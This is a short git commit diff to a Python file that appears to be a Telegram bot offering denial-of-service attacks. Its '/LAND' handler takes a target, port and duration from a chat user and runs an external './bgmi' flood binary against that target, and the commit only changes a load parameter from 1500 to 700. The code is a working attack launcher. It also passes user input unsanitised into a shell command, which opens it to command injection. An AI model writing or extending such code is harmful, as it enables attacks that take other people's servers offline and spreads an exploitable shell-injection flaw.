364b562b52f3786d7a4c442f9eee25b79043a0fc
ritikadkdi <darkbhai1bhai@gmail.com>
2025-02-18 19:26:59 +0530

    Update m.py

--- m.py
+++ m.py
@@ -313,7 +313,7 @@ def handle_LAND(message):
                 record_command_logs(user_id, '/LAND', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 1500"
+                full_command = f"./bgmi {target} {port} {time} 700"
                 process = subprocess.run(full_command, shell=True)
                 response = f"LAND Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
